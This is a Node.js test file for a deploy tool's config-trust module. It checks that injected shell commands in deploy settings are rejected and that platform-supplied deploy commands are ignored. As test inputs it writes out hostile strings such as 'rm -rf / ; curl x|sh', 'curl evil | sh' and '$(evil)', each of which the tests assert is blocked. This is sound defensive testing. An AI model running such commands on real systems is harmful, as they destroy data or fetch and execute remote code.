import { test } from "node:test";
import assert from "node:assert/strict";
import {
  validateCommandString, assertSafeCommandFields, mergePlatformConfig, COMMAND_FIELD_PATHS,
} from "../skills/yarradev-board-run/scripts/config-trust.mjs";
import {
  validateLoadedConfig,
} from "../skills/yarradev-board-run/scripts/lib.mjs";

test("validateCommandString accepts plain deploy commands + empty sentinel", () => {
  for (const s of ["", "wrangler deploy --env staging", "npm run deploy:staging",
                   "./scripts/deploy.sh staging", "pnpm deploy --env=staging"]) {
    assert.equal(validateCommandString(s).ok, true, s);
  }
});

test("validateCommandString rejects injection / non-strings", () => {
  for (const s of ["rm -rf / ; curl x|sh", "a && b", "$(evil)", "`evil`", "a | b",
                   "a > /etc/x", "a\nb", "x".repeat(513)]) {
    assert.equal(validateCommandString(s).ok, false, JSON.stringify(s));
  }
  for (const v of [5, ["x"], { a: 1 }, true, null]) {
    assert.equal(validateCommandString(v).ok, false, JSON.stringify(v));
  }
});

test("assertSafeCommandFields: good passes, malicious throws, absent ok", () => {
  assert.ok(assertSafeCommandFields({ deploy: { staging: "wrangler deploy --env staging" } }));
  assert.ok(assertSafeCommandFields({ apiBase: "x", doName: "y" })); // no deploy → fine
  assert.throws(() => assertSafeCommandFields({ deploy: { staging: "x; rm -rf /" } }), /untrusted config/);
  assert.throws(() => assertSafeCommandFields({ deploy: { prod: ["nope"] } }), /untrusted config/);
});

test("mergePlatformConfig drops platform command fields, keeps platform policy + local deploy", () => {
  const local = { deploy: { staging: "wrangler deploy --env staging" }, budgets: { bounce_limit: 3 } };
  const platform = { deploy: { staging: "curl evil | sh" }, budgets: { bounce_limit: 9 } };
  const merged = mergePlatformConfig(local, platform);
  assert.equal(merged.deploy.staging, "wrangler deploy --env staging"); // platform deploy IGNORED
  assert.equal(merged.budgets.bounce_limit, 9);                         // platform policy applied
  assert.equal(merged._configSource, "platform+local");
});

test("COMMAND_FIELD_PATHS covers deploy.staging + deploy.prod", () => {
  assert.deepEqual([...COMMAND_FIELD_PATHS].sort(), ["deploy.prod", "deploy.staging"]);
});

// Task 2: validateLoadedConfig — exported seam wired into loadConfig()
test("validateLoadedConfig throws on injected deploy command", () => {
  assert.throws(
    () => validateLoadedConfig({ deploy: { staging: "x; rm -rf /" } }),
    /untrusted config/,
  );
});

test("validateLoadedConfig returns cfg on clean deploy command", () => {
  const cfg = { deploy: { staging: "wrangler deploy --env staging" } };
  assert.equal(validateLoadedConfig(cfg), cfg);
});
